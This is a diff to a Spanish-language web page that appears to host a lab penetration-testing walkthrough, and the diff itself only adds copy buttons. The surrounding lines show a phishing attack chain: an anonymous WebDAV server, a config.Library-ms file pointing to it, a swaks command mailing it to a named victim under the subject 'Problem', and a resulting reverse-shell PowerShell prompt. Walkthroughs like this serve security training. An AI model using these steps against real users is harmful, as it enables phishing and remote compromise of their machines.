@@ -241,6 +241,7 @@ kali@kali:~$ mkdir /home/kali/webdav
 kali@kali:~$ touch /home/kali/webdav/test.txt
 kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
                 </code></pre>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
 
                 <h3>Creando el Archivo de Biblioteca</h3>
                 <p>Usaremos Visual Studio Code para crear un archivo de biblioteca llamado <code>config.Library-ms</code>. Este archivo incluirá configuraciones XML específicas para apuntar al recurso compartido WebDAV.</p>
@@ -266,6 +267,7 @@ kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anony
     </searchConnectorDescriptionList>
 </libraryDescription>
                 </code></pre>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
 
                 <h3>Enviando el Archivo al Correo</h3>
                 <p>Podemos enviar este archivo como adjunto utilizando la herramienta <code>swaks</code>:</p>
@@ -275,6 +277,7 @@ sudo swaks -t dave.wizzard@supermagicorp.com --from test@supermagicorp.com \
 --attach @config.Library-ms --server 192.168.132.199 --body @body.txt \
 --header "Subject: Problem" --suppress-data -ap
                 </code></pre>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
 
                 <p>Introduce las credenciales cuando se te solicite. Si todo se configura correctamente, la víctima ejecutará el archivo y se obtendrá una reverse shell.</p>
 
@@ -287,6 +290,7 @@ Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\Windows\System32\WindowsPowerShell\v1.0>
                 </code></pre>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
             `
         }
     ];
